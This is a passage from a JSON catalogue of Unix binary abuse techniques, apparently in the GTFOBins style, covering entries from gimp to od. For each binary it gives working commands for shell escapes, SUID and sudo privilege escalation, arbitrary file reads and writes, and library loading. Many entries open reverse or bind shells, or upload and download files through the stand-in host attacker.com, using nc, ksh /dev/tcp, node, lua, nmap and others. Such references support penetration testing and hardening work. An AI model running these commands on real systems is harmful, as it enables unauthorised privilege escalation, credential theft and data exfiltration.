      "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which gimp) .; chmod +s ./gimp'\n\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "Sudo": [
      "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    ]
  },
  "git": {
    "Shell": [
      "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
      "git help config\n!/bin/sh",
      "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x"
    ],
    "Sudo": [
      "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
      "sudo git -p help config\n!/bin/sh",
      "sudo git branch --help config\n!/bin/sh",
      "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which git) .; chmod +s ./git'\n\nPAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
    ]
  },
  "grep": {
    "File read": [
      "LFILE=file_to_read\ngrep '' $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which grep) .; chmod +s ./grep'\n\nLFILE=file_to_read\n./grep '' $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo grep '' $LFILE"
    ]
  },
  "gtester": {
    "Shell": [
      "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which gtester) .; chmod +s ./gtester'\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
    ]
  },
  "hd": {
    "File read": [
      "LFILE=file_to_read\nhd \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which hd) .; chmod +s ./hd'\n\nLFILE=file_to_read\n./hd \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo hd \"$LFILE\""
    ]
  },
  "head": {
    "File read": [
      "LFILE=file_to_read\nhead -c1G \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which head) .; chmod +s ./head'\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo head -c1G \"$LFILE\""
    ]
  },
  "hexdump": {
    "File read": [
      "LFILE=file_to_read\nhexdump -C \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which hexdump) .; chmod +s ./hexdump'\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\""
    ]
  },
  "highlight": {
    "File read": [
      "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which highlight) .; chmod +s ./highlight'\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\""
    ]
  },
  "iconv": {
    "File write": [
      "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\""
    ],
    "File read": [
      "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which iconv) .; chmod +s ./iconv'\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
    ]
  },
  "iftop": {
    "Shell": [
      "iftop\n!/bin/sh"
    ],
    "Sudo": [
      "sudo iftop\n!/bin/sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which iftop) .; chmod +s ./iftop'\n\n./iftop\n!/bin/sh"
    ]
  },
  "ionice": {
    "Shell": [
      "ionice /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ionice) .; chmod +s ./ionice'\n\n./ionice /bin/sh -p"
    ],
    "Sudo": [
      "sudo ionice /bin/sh"
    ]
  },
  "ip": {
    "File read": [
      "LFILE=file_to_read\nip -force -batch \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ip) .; chmod +s ./ip'\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\"",
      "sudo sh -c 'cp $(which ip) .; chmod +s ./ip'\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"",
      "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo"
    ]
  },
  "irb": {
    "Shell": [
      "irb\nexec '/bin/bash'"
    ],
    "Reverse shell": [
      "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"
    ],
    "File upload": [
      "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"
    ],
    "File write": [
      "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }"
    ],
    "File read": [
      "irb\nputs File.read(\"file_to_read\")"
    ],
    "Library load": [
      "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")"
    ],
    "Sudo": [
      "sudo irb\nexec '/bin/bash'"
    ]
  },
  "jjs": {
    "Shell": [
      "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"
    ],
    "File download": [
      "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs"
    ],
    "File write": [
      "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs"
    ],
    "File read": [
      "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which jjs) .; chmod +s ./jjs'\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
    ],
    "Sudo": [
      "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
    ]
  },
  "journalctl": {
    "Shell": [
      "journalctl\n!/bin/sh"
    ],
    "Sudo": [
      "sudo journalctl\n!/bin/sh"
    ]
  },
  "jq": {
    "File read": [
      "LFILE=file_to_read\njq -Rr . \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which jq) .; chmod +s ./jq'\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\""
    ]
  },
  "jrunscript": {
    "Shell": [
      "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
    ],
    "File download": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\""
    ],
    "File write": [
      "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"
    ],
    "File read": [
      "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which jrunscript) .; chmod +s ./jrunscript'\n\n./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "Sudo": [
      "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    ]
  },
  "ksh": {
    "Shell": [
      "ksh"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"
    ],
    "File upload": [
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"
    ],
    "File download": [
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"
    ],
    "File write": [
      "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'"
    ],
    "File read": [
      "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'",
      "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ksh) .; chmod +s ./ksh'\n\n./ksh -p"
    ],
    "Sudo": [
      "sudo ksh"
    ]
  },
  "ksshell": {
    "File read": [
      "LFILE=file_to_read\nksshell -i $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ksshell) .; chmod +s ./ksshell'\n\nLFILE=file_to_read\n./ksshell -i $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo ksshell -i $LFILE"
    ]
  },
  "ld.so": {
    "Shell": [
      "/lib/ld.so /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which ld.so) .; chmod +s ./ld.so'\n\n./ld.so /bin/sh -p"
    ],
    "Sudo": [
      "sudo /lib/ld.so /bin/sh"
    ]
  },
  "ldconfig": {
    "Sudo": [
      "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\""
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which ldconfig) .; chmod +s ./ldconfig'\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\""
    ]
  },
  "less": {
    "Shell": [
      "less /etc/profile\n!/bin/sh",
      "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv"
    ],
    "File write": [
      "echo DATA | less\nsfile_to_write\nq",
      "less file_to_write\nv"
    ],
    "File read": [
      "less file_to_read",
      "less /etc/profile\n:e file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which less) .; chmod +s ./less'\n\n./less file_to_read"
    ],
    "Sudo": [
      "sudo less /etc/profile\n!/bin/sh"
    ]
  },
  "logsave": {
    "Shell": [
      "logsave /dev/null /bin/sh -i"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which logsave) .; chmod +s ./logsave'\n\n./logsave /dev/null /bin/sh -i -p"
    ],
    "Sudo": [
      "sudo logsave /dev/null /bin/sh -i"
    ]
  },
  "look": {
    "File read": [
      "LFILE=file_to_read\nlook '' \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which look) .; chmod +s ./look'\n\nLFILE=file_to_read\n./look '' \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo look '' \"$LFILE\""
    ]
  },
  "ltrace": {
    "Shell": [
      "ltrace -b -L /bin/sh"
    ],
    "Sudo": [
      "sudo ltrace -b -L /bin/sh"
    ]
  },
  "lua": {
    "Shell": [
      "lua -e 'os.execute(\"/bin/sh\")'"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
    ],
    "Non-interactive bind shell": [
      "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
    ],
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
    ],
    "File download": [
      "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
    ],
    "File write": [
      "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
    ],
    "File read": [
      "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
    ],
    "Sudo": [
      "sudo lua -e 'os.execute(\"/bin/sh\")'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which lua) .; chmod +s ./lua'\n\n./lua -e 'os.execute(\"/bin/sh\")'"
    ]
  },
  "lwp-download": {
    "File download": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which lwp-download) .; chmod +s ./lwp-download'\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE"
    ],
    "Sudo": [
      "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE"
    ]
  },
  "lwp-request": {
    "File read": [
      "LFILE=file_to_read\nlwp-request \"file://$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which lwp-request) .; chmod +s ./lwp-request'\n\nLFILE=file_to_read\n./lwp-request \"file://$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\""
    ]
  },
  "mail": {
    "Shell": [
      "mail --exec='!/bin/sh'",
      "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh"
    ],
    "Sudo": [
      "sudo mail --exec='!/bin/sh'"
    ]
  },
  "make": {
    "Shell": [
      "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\""
    ],
    "File write": [
      "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" ."
    ],
    "SUID": [
      "sudo sh -c 'cp $(which make) .; chmod +s ./make'\n\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
    ],
    "Sudo": [
      "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
    ]
  },
  "man": {
    "Shell": [
      "man man\n!/bin/sh"
    ],
    "File read": [
      "man file_to_read"
    ],
    "Sudo": [
      "sudo man man\n!/bin/sh"
    ]
  },
  "mawk": {
    "Shell": [
      "mawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "File write": [
      "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
    ],
    "File read": [
      "LFILE=file_to_read\nmawk '//' \"$LFILE\""
    ],
    "Sudo": [
      "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which mawk) .; chmod +s ./mawk'\n\n./mawk 'BEGIN {system(\"/bin/sh\")}'"
    ]
  },
  "more": {
    "Shell": [
      "TERM= more /etc/profile\n!/bin/sh"
    ],
    "File read": [
      "more file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which more) .; chmod +s ./more'\n\n./more file_to_read"
    ],
    "Sudo": [
      "TERM= sudo more /etc/profile\n!/bin/sh"
    ]
  },
  "mount": {
    "Sudo": [
      "sudo mount -o bind /bin/sh /bin/mount\nsudo mount"
    ]
  },
  "mtr": {
    "File read": [
      "LFILE=file_to_read\nmtr --raw -F \"$LFILE\""
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""
    ]
  },
  "mv": {
    "SUID": [
      "sudo sh -c 'cp $(which mv) .; chmod +s ./mv'\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"
    ]
  },
  "mysql": {
    "Shell": [
      "mysql -e '\\! /bin/sh'"
    ],
    "Library load": [
      "mysql --default-auth ../../../../../path/to/lib"
    ],
    "Sudo": [
      "sudo mysql -e '\\! /bin/sh'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which mysql) .; chmod +s ./mysql'\n\n./mysql -e '\\! /bin/sh'"
    ]
  },
  "nano": {
    "Shell": [
      "nano\n^R^X\nreset; sh 1>&0 2>&0",
      "nano -s /bin/sh\n/bin/sh\n^T"
    ],
    "File write": [
      "nano file_to_write\nDATA\n^O"
    ],
    "File read": [
      "nano file_to_read"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which nano) .; chmod +s ./nano'\n\n./nano\n^R^X\nreset; sh 1>&0 2>&0"
    ],
    "Sudo": [
      "sudo nano\n^R^X\nreset; sh 1>&0 2>&0"
    ]
  },
  "nawk": {
    "Shell": [
      "nawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Non-interactive reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "Non-interactive bind shell": [
      "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    ],
    "File write": [
      "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
    ],
    "File read": [
      "LFILE=file_to_read\nnawk '//' \"$LFILE\""
    ],
    "Sudo": [
      "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which nawk) .; chmod +s ./nawk'\n\n./nawk 'BEGIN {system(\"/bin/sh\")}'"
    ]
  },
  "nc": {
    "Reverse shell": [
      "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT"
    ],
    "Bind shell": [
      "LPORT=12345\nnc -l -p $LPORT -e /bin/sh"
    ],
    "File upload": [
      "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\""
    ],
    "File download": [
      "LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\""
    ],
    "Sudo": [
      "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which nc) .; chmod +s ./nc'\n\nRHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT"
    ]
  },
  "nice": {
    "Shell": [
      "nice /bin/sh"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which nice) .; chmod +s ./nice'\n\n./nice /bin/sh -p"
    ],
    "Sudo": [
      "sudo nice /bin/sh"
    ]
  },
  "nl": {
    "File read": [
      "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which nl) .; chmod +s ./nl'\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"
    ],
    "Sudo": [
      "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE"
    ]
  },
  "nmap": {
    "Shell": [
      "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF",
      "nmap --interactive\nnmap> !sh"
    ],
    "Non-interactive reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF"
    ],
    "Non-interactive bind shell": [
      "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF"
    ],
    "File upload": [
      "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE",
      "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF"
    ],
    "File download": [
      "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE",
      "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF"
    ],
    "File write": [
      "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF"
    ],
    "File read": [
      "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF"
    ],
    "Sudo": [
      "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF",
      "sudo nmap --interactive\nnmap> !sh"
    ],
    "Limited SUID": [
      "sudo sh -c 'cp $(which nmap) .; chmod +s ./nmap'\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF"
    ]
  },
  "node": {
    "Shell": [
      "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'"
    ],
    "Reverse shell": [
      "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nnet.connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n});'"
    ],
    "Bind shell": [
      "export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT);'"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which node) .; chmod +s ./node'\n\n./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'"
    ],
    "Sudo": [
      "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'"
    ],
    "Capabilities": [
      "cp $(which node) .\nsudo setcap cap_setuid+ep node\n\n./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'"
    ]
  },
  "nohup": {
    "Shell": [
      "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    ],
    "Command": [
      "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out"
    ],
    "SUID": [
      "sudo sh -c 'cp $(which nohup) .; chmod +s ./nohup'\n\nsudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
    ],
    "Sudo": [
      "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    ]
  },
  "nroff": {
    "Shell": [
      "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff"
    ],
    "Sudo": [
      "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"
    ]
  },
  "nsenter": {
    "Shell": [
      "nsenter /bin/sh"
    ],
    "Sudo": [
      "sudo nsenter /bin/sh"
    ]
  },
  "od": {
    "File read": [
      "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\""
    ],
    "SUID": [
      "sudo sh -c 'cp $(which od) .; chmod +s ./od'\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""
    ],
    "Sudo": [
